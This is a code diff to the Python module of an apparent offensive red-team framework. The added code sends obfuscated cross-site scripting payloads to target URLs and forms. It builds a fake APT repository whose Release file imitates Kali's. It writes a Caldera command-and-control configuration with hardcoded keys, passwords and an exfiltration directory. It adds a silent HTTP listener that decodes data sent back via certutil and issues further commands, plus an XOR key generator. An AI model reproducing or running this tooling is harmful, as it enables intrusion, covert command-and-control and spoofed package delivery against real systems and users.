@@ -55,18 +55,19 @@ from threading import Timer
 from bs4 import BeautifulSoup
 from itertools import product
 from pykeepass import PyKeePass
+import xml.etree.ElementTree as ET
+from html.parser import HTMLParser
 from stix2 import MemoryStore, Filter
 from libnmap.parser import NmapParser
 from netaddr import IPAddress, IPRange
 from libnmap.process import NmapProcess
 from impacket.dcerpc.v5 import transport
-from datetime import datetime, timedelta, date, timezone
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import quote, unquote, urlparse
 from impacket.dcerpc.v5.dcomrt import IObjectExporter
 from modules.lazyencoder_decoder import encode, decode
+from datetime import datetime, timedelta, date, timezone
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
-from html.parser import HTMLParser
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
@@ -1459,7 +1460,7 @@ def get_credentials(file = None):
     credential_files = glob.glob(f"{path}/sessions/credentials*.txt")
 
     if not credential_files:
-        print_error("No credential files found. Please create one using: createcredentials admin:admin")
+        print_error(f"No credential files found ({credential_files}). Please create one using: createcredentials admin:admin")
         return []
     
     print_msg("The following credential files were found:")
@@ -1574,6 +1575,12 @@ def inject_payloads(urls, payload_url, request_timeout=15):
                 for payload in payloads:
                     obfuscated_payload = obfuscate_payload(payload.format(payload_url))
                     query_params[key] = obfuscated_payload
+                    query_string = urllib.parse.urlencode(query_params, doseq=True)
+                    full_url = f"{raw_url}{query_string}&xss={obfuscated_payload}"
+                    print_msg(f"[INFO] Sending request to {full_url}")
+                    resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
+                    resp.raise_for_status()
+                    handle_forms(resp.content, full_url)
 
             updated_query = urllib.parse.urlencode(query_params, doseq=True)
             full_url = parsed_url._replace(query=updated_query).geturl()
@@ -1602,7 +1609,8 @@ def inject_payloads(urls, payload_url, request_timeout=15):
             if not form_data:
                 print_warn("[WARN] No input fields found in form.")
                 continue
-
+            urls_str = ''.join(urls)
+            action = f"http://{urls_str}/{action}"
             try:
                 if method == 'POST':
                     resp = requests.post(action, data=form_data, headers={'User-Agent': 'Mozilla/5.0'})
@@ -2224,24 +2232,301 @@ def ProcessResults(results, outfile):
 			outfile.write(result[0] + "\t\t-- " + result[1] + " -- " + detailed_codes[result[1]] + "\n")
 
 def generate_index(repo_dir):
-    simple_dir = os.path.join(repo_dir, 'simple')
-    os.makedirs(simple_dir, exist_ok=True)
+    """
+    Generates an APT repository structure and index files for proper compatibility.
+
+    Parameters:
+    repo_dir (str): Path to the repository directory.
+
+    Returns:
+    None
+    """
+    dists_dir = os.path.join(repo_dir, 'dists/kali-rolling/main/binary-amd64')
+    os.makedirs(dists_dir, exist_ok=True)
+
+    pool_dir = os.path.join(repo_dir, 'pool/main')
+    os.makedirs(pool_dir, exist_ok=True)
+
+    for package in os.listdir(repo_dir):
+        if package.endswith('.deb'):
+            shutil.move(os.path.join(repo_dir, package), os.path.join(pool_dir, package))
+
+    subprocess.run(
+        f"dpkg-scanpackages {pool_dir} /dev/null > {dists_dir}/Packages",
+        shell=True, check=True
+    )
+    subprocess.run(
+        f"gzip -9c {dists_dir}/Packages > {dists_dir}/Packages.gz",
+        shell=True, check=True
+    )
+    subprocess.run(
+        f"xz -9c {dists_dir}/Packages > {dists_dir}/Packages.xz",
+        shell=True, check=True
+    )
+
+    release_file = os.path.join(repo_dir, 'dists/kali-rolling/Release')
+    with open(release_file, 'w') as release:
+        release.write("Origin: Kali\n")
+        release.write("Label: Kali\n")
+        release.write("Suite: rolling\n")
+        release.write("Codename: kali-rolling\n")
+        release.write("Architectures: amd64\n")
+        release.write("Components: main\n")
+        release.write("Description: Kali Rolling Repository\n")
 
     index_content = []
-    for package in os.listdir(repo_dir):
-        if package.endswith(('.whl', '.tar.gz')):
-            package_name = package.split('-')[0]
-            package_dir = os.path.join(simple_dir, package_name)
-            os.makedirs(package_dir, exist_ok=True)
-            shutil.move(os.path.join(repo_dir, package), os.path.join(package_dir, package))
-            index_content.append(f'<a href="{package_name}/">{package_name}</a><br>')
+    for root, _, files in os.walk(repo_dir):
+        for file in files:
+            file_path = os.path.relpath(os.path.join(root, file), repo_dir)
+            index_content.append(f'<a href="{file_path}">{file}</a><br>')
 
-    with open(os.path.join(simple_dir, 'index.html'), 'w') as index_file:
+    with open(os.path.join(repo_dir, 'index.html'), 'w') as index_file:
         index_file.write('<html><body>\n')
-        index_file.write('<h1>Simple Index</h1>\n')
+        index_file.write('<h1>APT Repository Index</h1>\n')
         index_file.write(''.join(index_content))
         index_file.write('</body></html>\n')
+
+
+
+def replace_variables(command, variables):
+    for var, value in variables.items():
+        value = str(value)
+        command = command.replace(var, value)
+    return command
+
+def create_caldera_config(file_path):
+    """
+    Creates a Caldera configuration file with the specified content at the given file path.
+
+    Parameters:
+    file_path (str): The path where the configuration file will be created.
+
+    Returns:
+    None
+    """
+    config_content = """
+ability_refresh: 60
+api_key_blue: LAZYOWNBLUEADMIN123
+api_key_red: LAZYOWNREDADMIN123
+app.contact.dns.domain: mycaldera.caldera
+app.contact.dns.socket: 0.0.0.0:8853
+app.contact.gist: API_KEY
+app.contact.html: /weather
+app.contact.http: http://0.0.0.0:8888
+app.contact.slack.api_key: SLACK_TOKEN
+app.contact.slack.bot_id: SLACK_BOT_ID
+app.contact.slack.channel_id: SLACK_CHANNEL_ID
+app.contact.tunnel.ssh.host_key_file: REPLACE_WITH_KEY_FILE_PATH
+app.contact.tunnel.ssh.host_key_passphrase: REPLACE_WITH_KEY_FILE_PASSPHRASE
+app.contact.tunnel.ssh.socket: 0.0.0.0:8022
+app.contact.tunnel.ssh.user_name: grisun0
+app.contact.tunnel.ssh.user_password: grisgrisgris
+app.contact.ftp.host: 0.0.0.0
+app.contact.ftp.port: 2222
+app.contact.ftp.pword: lazyown
+app.contact.ftp.server.dir: ftp_dir
+app.contact.ftp.user: lazyown_user
+app.contact.tcp: 0.0.0.0:7010
+app.contact.udp: 0.0.0.0:7011
+app.contact.websocket: 0.0.0.0:7012
+app.frontend.api_base_url: http://localhost:8888
+objects.planners.default: atomic
+crypt_salt: REPLACE_WITH_RANDOM_VALUE
+encryption_key: LAZYOWNADMIN123
+exfil_dir: /tmp/lazyown
+reachable_host_traits:
+- remote.host.fqdn
+- remote.host.ip
+host: 0.0.0.0
+plugins:
+- access
+- atomic
+- compass
+- debrief
+- fieldmanual
+- manx
+- response
+- sandcat
+- stockpile
+- training
+port: 8888
+reports_dir: /tmp
+auth.login.handler.module: default
+requirements:
+  go:
+    command: go version
+    type: installed_program
+    version: 1.19
+  python:
+    attr: version
+    module: sys
+    type: python_module
+    version: 3.12.7
+users:
+  blue:
+    blue: lazyownblueadmin
+  red:
+    admin: lazyownredteamtheadmin
+    red: lazyownredteamadmin
+"""
+
+    try:
+        with open(file_path, 'w') as file:
+            file.write(config_content)
+        print_msg(f"Configuration file created successfully at {file_path}")
+    except Exception as e:
+        print_error(f"Error creating configuration file: {e}")
+
+def extract_banners(xml_file):
+    
+    tree = ET.parse(xml_file)
+    root = tree.getroot()
+    
+    banners = []
+    for host in root.findall('host'):
         
+        hostname = host.find('address').get('addr')
+        
+        for port in host.findall('ports/port'):
+            
+            service = port.find('service')
+            if service is not None:
+                name = service.get('name')
+
+                extrainfo = service.get('extrainfo')
+            
+           
+                banners.append({
+                    'hostname': hostname,
+                    'port': port.get('portid'),
+                    'protocol': port.get('protocol'),
+                    'banner': extrainfo,
+                
+                    'service': name
+                })
+
+    return banners
+
+def generate_xor_key(length):
+    """
+    Generate key XOR long specifyed
+
+    :param length: Lenght of XOR key
+    :return: Key XOR in hex.
+    """
+    if length <= 0:
+        raise ValueError("The lenght must be logg than 0")
+    key_bytes = [random.randint(0, 255) for _ in range(length)]
+    key_hex = ''.join(f'{byte:02X}' for byte in key_bytes)
+
+    return key_hex
+class MyServer(HTTPServer):
+    """
+    Custom HTTP server to handle incoming connections from certutil.
+    """
+    pass
+
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    """
+    Custom HTTP request handler to intercept and decode GET requests from certutil.
+    """
+    def log_request(self, *args, **kwargs):
+        return
+
+    def log_message(self, *args, **kwargs):
+        return
+
+    def do_GET(self):
+        global query_id
+        self.send_error(404)
+
+        with open('payload.json', 'r') as file:
+            data = json.load(file)
+        url = data.get('url', 'URL not found')
+        lhost = data.get('lhost', 'LHOST not found')
+        if query_id % 2 == 0:
+            output = self.path
+            if output != '/':
+                print(decode(output[1:]))
+            get_command(url, lhost)
+        query_id += 1
+
+
+class IP2ASN:
+    def __init__(self):
+        self.as_name = {}
+        self.as_country = {}
+        self.recs = []
+
+    def open_file(self, filename):
+        """Open and parse the IP-to-ASN file."""
+        with open(filename, 'rb') as f:
+            self.open_reader(f)
+
+    def open_reader(self, reader):
+        """Parse the reader stream, handling both regular and gzipped files."""
+        if reader.read(2) == b'\x1f\x8b':
+            reader.seek(0)
+            with gzip.open(reader, 'rb') as f:
+                self._parse_file(f)
+        else:
+            reader.seek(0)
+            self._parse_file(reader)
+
+    def _parse_file(self, reader):
+        """Parse the TSV data and load it into memory."""
+        for line in reader:
+            line = line.decode('utf-8').strip()
+            parts = line.split('\t')
+            if len(parts) < 5:
+                continue
+            start_ip, end_ip, asn, country, desc = parts[:5]
+
+            if desc == "Not routed":
+                continue
+
+            try:
+                asn = int(asn)
+            except ValueError:
+                continue
+
+            if asn not in self.as_name:
+                self.as_name[asn] = desc
+                self.as_country[asn] = country
+
+            try:
+                start_ip = IPAddress(start_ip)
+                end_ip = IPAddress(end_ip)
+                self.recs.append((start_ip, end_ip, asn))
+            except ValueError:
+                continue
+
+        self.recs.sort(key=lambda x: x[0])
+
+    def as_of_ip(self, ip):
+        """Return the ASN associated with the given IP address."""
+        ip = IPAddress(ip)
+        idx = bisect.bisect_left(self.recs, (ip, ip, 0))
+        return self._rec_index_has_ip(idx - 1, ip)
+
+    def _rec_index_has_ip(self, idx, ip):
+        """Check if the given index contains the IP."""
+        if idx < 0 or idx >= len(self.recs):
+            return 0
+        start_ip, end_ip, asn = self.recs[idx]
+        if start_ip <= ip <= end_ip:
+            return asn
+        return 0
+
+    def as_name(self, asn):
+        """Get the AS name by ASN."""
+        return self.as_name.get(asn, "Unknown")
+
+    def as_country(self, asn):
+        """Get the country by ASN."""
+        return self.as_country.get(asn, "Unknown")
+
+
 signal.signal(signal.SIGINT, signal_handler)
 arguments = sys.argv[1:]  
 
